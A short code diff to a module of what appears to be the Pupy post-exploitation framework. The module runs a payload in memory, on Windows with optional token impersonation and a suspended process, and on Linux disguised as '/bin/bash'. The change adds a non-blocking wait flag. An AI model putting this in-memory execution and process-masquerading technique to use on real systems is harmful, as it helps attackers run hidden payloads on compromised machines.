@@ -39,7 +39,8 @@ class MemoryDuplicate(PupyModule):
         if self.client.is_windows():
             exec_pe(
                 self, "", raw_pe=payload, interactive=False,
-                use_impersonation=args.impersonate, suspended_process=args.process
+                use_impersonation=args.impersonate, suspended_process=args.process,
+                wait=False
             )
         elif self.client.is_linux():
             mexec(self, payload, [], argv0='/bin/bash', raw=True)
